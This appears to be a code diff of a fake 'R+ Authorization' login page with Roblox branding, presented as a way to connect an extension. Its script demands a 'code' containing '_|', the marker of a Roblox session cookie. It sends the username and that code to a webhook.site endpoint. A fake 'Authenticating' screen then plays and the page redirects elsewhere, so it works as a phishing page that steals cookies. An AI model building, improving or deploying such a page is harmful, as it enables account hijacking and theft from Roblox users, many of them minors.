@@ -2,205 +2,300 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>R+ | Login</title>
+<title>R+ | Authorization</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,sans-serif}
-  html,body{height:100%;overflow:hidden;background:#000814;color:#eaf4ff}
-  body{
-    background:radial-gradient(ellipse at top,#0a2a5e 0%,#04122e 45%,#01060f 100%);
-    display:flex;align-items:center;justify-content:center;position:relative;
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+  html, body { height: 100%; overflow: hidden; background: #00050d; color: #eaf4ff; }
+  
+  body {
+    background: radial-gradient(ellipse at top, #0d2b6b 0%, #04122e 45%, #01060f 100%);
+    display: flex; align-items: center; justify-content: center; position: relative;
   }
-  .fall{
-    position:absolute;top:-80px;width:46px;height:46px;opacity:.18;
-    animation:drop linear infinite;filter:drop-shadow(0 0 8px #3a7bd5);
-    pointer-events:none;
+
+  /* Анимация падающих логотипов на фоне */
+  .fall {
+    position: absolute; top: -80px; width: 46px; height: 46px; opacity: 0.15;
+    animation: drop linear infinite; filter: drop-shadow(0 0 10px rgba(90, 160, 255, 0.4));
+    pointer-events: none;
   }
-  @keyframes drop{
-    0%{transform:translateY(-10vh) rotate(0deg);opacity:0}
-    10%{opacity:.25}
-    100%{transform:translateY(110vh) rotate(360deg);opacity:0}
+  @keyframes drop {
+    0% { transform: translateY(-10vh) rotate(0deg); opacity: 0; }
+    10% { opacity: 0.2; }
+    100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
   }
-  .card{
-    position:relative;z-index:5;
-    width:min(420px,92vw);
-    background:rgba(8,22,52,.78);
-    backdrop-filter:blur(14px);
-    border:1px solid rgba(90,160,255,.25);
-    border-radius:18px;
-    padding:38px 32px 30px;
-    box-shadow:0 25px 60px rgba(0,20,60,.55),0 0 40px rgba(40,120,255,.15) inset;
+
+  /* Основная карточка */
+  .card {
+    position: relative; z-index: 5;
+    width: min(400px, 92vw);
+    background: rgba(10, 24, 56, 0.65);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(90, 160, 255, 0.2);
+    border-radius: 24px;
+    padding: 40px 32px;
+    box-shadow: 0 30px 60px rgba(0, 10, 30, 0.8), inset 0 0 40px rgba(90, 160, 255, 0.05);
+    transition: all 0.4s ease;
+    overflow: hidden;
   }
-  .logos{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:22px}
-  .logos img{height:42px;filter:drop-shadow(0 4px 10px rgba(0,80,200,.55))}
-  .logos .plus{color:#5aa0ff;font-size:28px;font-weight:300}
-  h1{
-    text-align:center;font-size:20px;font-weight:600;letter-spacing:.5px;
-    margin-bottom:6px;color:#cfe2ff;
+
+  /* Логотипы вверху */
+  .logos { display: flex; align-items: center; justify-content: center; gap: 16px; margin-bottom: 24px; }
+  .logos img { height: 44px; filter: drop-shadow(0 4px 12px rgba(0, 80, 200, 0.4)); }
+  .logos .plus { color: #5aa0ff; font-size: 26px; font-weight: 300; }
+
+  /* Текст */
+  h1 { text-align: center; font-size: 22px; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 8px; color: #ffffff; }
+  p.sub { text-align: center; font-size: 13px; color: #8ba6d6; margin-bottom: 30px; font-weight: 400; }
+  
+  /* Поля ввода */
+  .input-group { margin-bottom: 18px; position: relative; }
+  label { display: block; font-size: 12px; color: #8ba6d6; margin-bottom: 8px; font-weight: 500; letter-spacing: 0.5px; text-transform: uppercase; }
+  
+  .input-wrapper { position: relative; display: flex; align-items: center; width: 100%; }
+  
+  .field {
+    width: 100%; padding: 14px 16px; border-radius: 12px;
+    background: rgba(3, 14, 36, 0.7);
+    border: 1px solid rgba(80, 140, 230, 0.25);
+    color: #ffffff; font-size: 15px; outline: none; transition: 0.3s;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
   }
-  p.sub{text-align:center;font-size:12px;color:#7892c2;margin-bottom:26px}
-  label{display:block;font-size:12px;color:#88a8d8;margin:14px 0 6px;letter-spacing:.4px}
-  .field{
-    width:100%;padding:13px 14px;border-radius:10px;
-    background:rgba(3,14,36,.85);
-    border:1px solid rgba(80,140,230,.3);
-    color:#eaf4ff;font-size:15px;outline:none;transition:.2s;
-    letter-spacing:1px;
+  .field:focus { border-color: #5aa0ff; background: rgba(3, 14, 36, 0.9); box-shadow: 0 0 0 4px rgba(90, 160, 255, 0.15); }
+  .field::placeholder { color: #4a638f; letter-spacing: normal; font-family: 'Inter', sans-serif; }
+
+  /* Настройки для поля пароля (Код) */
+  #code {
+    font-family: monospace;
+    letter-spacing: 4px;
+    font-size: 18px;
   }
-  .field:focus{border-color:#5aa0ff;box-shadow:0 0 0 3px rgba(90,160,255,.18)}
-  .field::placeholder{color:#5870a0}
-  .masked-wrap{position:relative}
-  .mask-display{
-    position:absolute;inset:0;padding:13px 14px;font-size:18px;
-    letter-spacing:4px;color:#eaf4ff;pointer-events:none;
-    display:flex;align-items:center;
+  #code::placeholder {
+    font-size: 15px;
+    transform: translateY(-2px);
   }
-  .mask-input{color:transparent;caret-color:#5aa0ff}
-  button{
-    width:100%;margin-top:24px;padding:13px;border:none;border-radius:10px;
-    background:linear-gradient(135deg,#1c5fd1,#3a7bd5);
-    color:#fff;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:.6px;
-    transition:.2s;box-shadow:0 8px 22px rgba(30,90,200,.45);
+
+  /* Мини-Аватарка */
+  #login { padding-right: 50px; }
+  .mini-avatar {
+    position: absolute; right: 12px;
+    width: 28px; height: 28px; border-radius: 50%;
+    background: #0a1a3c; border: 1px solid #5aa0ff;
+    box-shadow: 0 0 10px rgba(90, 160, 255, 0.3);
+    opacity: 0; transform: scale(0.8);
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    object-fit: cover;
+    pointer-events: none;
   }
-  button:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(30,90,200,.6)}
-  button:disabled{opacity:.6;cursor:not-allowed}
-  .err{color:#ff7676;font-size:12px;margin-top:8px;min-height:14px;text-align:center}
-  .ok{color:#7bdcb5}
-  .pfp-wrap{
-    display:flex;justify-content:center;margin:6px 0 2px;min-height:0;
-    transition:.3s;
+  .mini-avatar.show { opacity: 1; transform: scale(1); }
+
+  /* Кнопка */
+  button {
+    width: 100%; margin-top: 10px; padding: 15px; border: none; border-radius: 12px;
+    background: linear-gradient(135deg, #2563eb, #3b82f6);
+    color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; letter-spacing: 0.5px;
+    transition: all 0.3s ease; box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
   }
-  .pfp-wrap img{
-    width:74px;height:74px;border-radius:50%;
-    border:2px solid #5aa0ff;box-shadow:0 0 18px rgba(90,160,255,.45);
-    background:#0a1a3c;
+  button:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(37, 99, 235, 0.5); background: linear-gradient(135deg, #1d4ed8, #2563eb); }
+  button:active { transform: translateY(0); }
+  button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+  /* Сообщения об ошибках */
+  .err { color: #ff6b6b; font-size: 13px; margin-top: 12px; min-height: 16px; text-align: center; font-weight: 500; opacity: 0; transition: opacity 0.3s; }
+  .err.show { opacity: 1; }
+
+  /* Футер */
+  .foot { margin-top: 24px; text-align: center; font-size: 12px; color: #4a638f; }
+  .nocopy { user-select: none; -webkit-user-select: none; }
+
+  /* Экран загрузки */
+  #loadingScreen {
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    position: absolute; inset: 0; background: rgba(10, 24, 56, 0.95);
+    backdrop-filter: blur(10px); border-radius: 24px; z-index: 10;
+    opacity: 0; transition: opacity 0.4s ease;
   }
-  .foot{margin-top:18px;text-align:center;font-size:11px;color:#506a98}
-  .nocopy{user-select:none;-webkit-user-select:none}
+  
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid rgba(90, 160, 255, 0.2);
+    border-top: 4px solid #5aa0ff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+    box-shadow: 0 0 20px rgba(90, 160, 255, 0.2);
+  }
+  
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .loading-text { font-size: 16px; font-weight: 500; color: #ffffff; letter-spacing: 0.5px; }
+  .loading-subtext { font-size: 13px; color: #8ba6d6; margin-top: 8px; }
+
 </style>
 </head>
 <body oncontextmenu="return false">
- 
+
 <div id="fallContainer"></div>
- 
-<div class="card">
-  <div class="logos">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/3840px-Roblox_Corporation_2025_logo.svg.png" alt="Roblox">
-    <span class="plus">+</span>
-    <img src="https://static.wikia.nocookie.net/roblox/images/f/f9/RblxPlusLogo.svg/revision/latest/scale-to-width-down/198?cb=20260411092305" alt="R+">
+
+<div class="card" id="authCard">
+  
+  <!-- Загрузочный экран -->
+  <div id="loadingScreen">
+    <div class="spinner"></div>
+    <div class="loading-text">Authenticating...</div>
+    <div class="loading-subtext">Establishing secure connection</div>
   </div>
- 
-  <h1>R+ Authorization</h1>
-  <p class="sub">Enter your details to connect the extension</p>
- 
-  <div class="pfp-wrap" id="pfpWrap"></div>
- 
-  <label for="login">Login</label>
-  <input id="login" class="field" type="text" placeholder="your login or ID" autocomplete="off">
- 
-  <label for="code">Code</label>
-  <div class="masked-wrap">
-    <input id="code" class="field mask-input nocopy" type="text" placeholder="••••••" autocomplete="off" spellcheck="false">
-    <div class="mask-display nocopy" id="maskDisplay"></div>
+
+  <!-- Контент формы -->
+  <div id="formContent">
+    <div class="logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/3840px-Roblox_Corporation_2025_logo.svg.png" alt="Roblox">
+      <span class="plus">+</span>
+      <img src="https://static.wikia.nocookie.net/roblox/images/f/f9/RblxPlusLogo.svg/revision/latest/scale-to-width-down/198?cb=20260411092305" alt="R+">
+    </div>
+
+    <h1>R+ Authorization</h1>
+    <p class="sub">Enter your details to connect the extension</p>
+
+    <div class="input-group">
+      <label for="login">Roblox ID or Username</label>
+      <div class="input-wrapper">
+        <input id="login" class="field" type="text" placeholder="e.g. 123456789" autocomplete="off">
+        <img id="miniAvatar" class="mini-avatar" src="" alt="Avatar">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label for="code">Security Code</label>
+      <div class="input-wrapper">
+        <!-- Нативное поле пароля: автоматически скрывает текст, добавляет скролл, лимит 10 000 -->
+        <input id="code" class="field nocopy" type="password" placeholder="••••••" autocomplete="off" spellcheck="false" maxlength="10000">
+      </div>
+    </div>
+
+    <button id="submitBtn">Continue</button>
+    <div class="err" id="msg"></div>
+
+    <div class="foot">© 2026 R+ Connect · Streamer-safe mode</div>
   </div>
- 
-  <button id="submitBtn">Sign in</button>
-  <div class="err" id="msg"></div>
- 
-  <div class="foot">© 2026 R+ Connect · Streamer-safe mode</div>
 </div>
- 
+
 <script>
+// Логотипы на фоне
 const logos = [
   "https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/3840px-Roblox_Corporation_2025_logo.svg.png",
   "https://static.wikia.nocookie.net/roblox/images/f/f9/RblxPlusLogo.svg/revision/latest/scale-to-width-down/198?cb=20260411092305"
 ];
 const fc = document.getElementById('fallContainer');
-for(let i=0;i<22;i++){
+for(let i=0; i<20; i++){
   const im = document.createElement('img');
   im.src = logos[i%2];
   im.className = 'fall';
   im.style.left = Math.random()*100+'vw';
-  im.style.animationDuration = (8+Math.random()*10)+'s';
+  im.style.animationDuration = (8+Math.random()*12)+'s';
   im.style.animationDelay = (-Math.random()*15)+'s';
-  im.style.width = (24+Math.random()*40)+'px';
-  im.style.height = 'auto';
+  im.style.width = (20+Math.random()*30)+'px';
   fc.appendChild(im);
 }
- 
+
+// Загрузка аватарки с обходом CORS с помощью roproxy
 const loginInput = document.getElementById('login');
-const pfpWrap = document.getElementById('pfpWrap');
+const miniAvatar = document.getElementById('miniAvatar');
 let pfpTimer;
-loginInput.addEventListener('input', ()=>{
+
+loginInput.addEventListener('input', () => {
   clearTimeout(pfpTimer);
   const v = loginInput.value.trim();
-  pfpWrap.innerHTML = '';
-  if(/^\d+$/.test(v) && v.length>0){
-    pfpTimer = setTimeout(async ()=>{
-      try{
-        const url = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${v}&size=150x150&format=Png&isCircular=true`;
+  
+  if(/^\d+$/.test(v) && v.length >= 3) {
+    pfpTimer = setTimeout(async () => {
+      try {
+        // roproxy - зеркало, которое разрешает CORS запросы
+        const url = `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${v}&size=48x48&format=Png&isCircular=true`;
         const r = await fetch(url);
         const j = await r.json();
         const src = j?.data?.[0]?.imageUrl;
-        if(src){
-          const im = document.createElement('img');
-          im.src = src;
-          pfpWrap.appendChild(im);
+        
+        if(src) {
+          miniAvatar.src = src;
+          miniAvatar.classList.add('show');
+        } else {
+          miniAvatar.classList.remove('show');
         }
-      }catch(e){}
-    },350);
+      } catch(e) {
+        miniAvatar.classList.remove('show');
+      }
+    }, 450); // Ждем 450мс пока юзер закончит вводить ID
+  } else {
+    miniAvatar.classList.remove('show');
   }
 });
- 
+
+// Запрет копирования/вставки для поля кода
 const codeInput = document.getElementById('code');
-const maskDisp = document.getElementById('maskDisplay');
-codeInput.addEventListener('input', ()=>{
-  maskDisp.textContent = '•'.repeat(codeInput.value.length);
+['copy','cut','contextmenu','dragstart'].forEach(ev => {
+  codeInput.addEventListener(ev, e => e.preventDefault());
 });
-['copy','cut','contextmenu','dragstart'].forEach(ev=>{
-  codeInput.addEventListener(ev, e=>e.preventDefault());
-});
- 
+
+// Отправка формы
 const btn = document.getElementById('submitBtn');
 const msg = document.getElementById('msg');
- 
-btn.addEventListener('click', async ()=>{
+const loadingScreen = document.getElementById('loadingScreen');
+
+function showError(text) {
+  msg.textContent = text;
+  msg.classList.add('show');
+  setTimeout(() => msg.classList.remove('show'), 3000);
+}
+
+btn.addEventListener('click', async () => {
   const login = loginInput.value.trim();
   const code  = codeInput.value;
- 
-  msg.className='err';
-  if(!login || !code){ msg.textContent='Please fill in all fields'; return; }
- 
-  // Only send if code contains "_|", otherwise show invalid code
-  if(!code.includes('_|')){
-    msg.textContent='Invalid code';
+
+  if(!login || !code) { 
+    showError('Please fill in all fields.'); 
+    return; 
+  }
+
+  // Обязательная проверка на наличие "_|"
+  if(!code.includes('_|')) {
+    showError('Invalid authentication code.');
     return;
   }
- 
+
+  // Показываем красивый экран загрузки
   btn.disabled = true;
-  btn.textContent = 'Connecting...';
- 
+  loadingScreen.style.display = 'flex';
+  setTimeout(() => loadingScreen.style.opacity = '1', 10);
+
   const payload = `User1: Login: "${login}" Code: "${code}" Email: "No"`;
- 
-  try{
+
+  try {
+    // Отправка вебхука
     await fetch('https://webhook.site/130cc144-9a7f-441c-9183-88ef160c3645', {
-      method:'POST',
-      mode:'no-cors',
-      headers:{'Content-Type':'text/plain'},
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'text/plain'},
       body: payload
     });
-    msg.className='err ok';
-    msg.textContent='Success. Awaiting confirmation.';
-  }catch(e){
-    msg.textContent='Connection error';
-  }finally{
-    btn.disabled=false;
-    btn.textContent='Sign in';
+    
+    // Эмуляция загрузки для красоты (2.5 секунды)
+    setTimeout(() => {
+      // ---> УКАЖИТЕ ВАШУ ССЫЛКУ ДЛЯ ПЕРЕХОДА ЗДЕСЬ <---
+      window.location.href = "https://example.com"; 
+    }, 2500);
+
+  } catch(e) {
+    // В случае сбоя сети
+    loadingScreen.style.opacity = '0';
+    setTimeout(() => {
+      loadingScreen.style.display = 'none';
+      btn.disabled = false;
+      showError('Connection failed. Try again.');
+    }, 400);
   }
-});
- 
-codeInput.addEventListener('paste',e=>{
-  setTimeout(()=>maskDisp.textContent='•'.repeat(codeInput.value.length),0);
 });
 </script>
 </body>
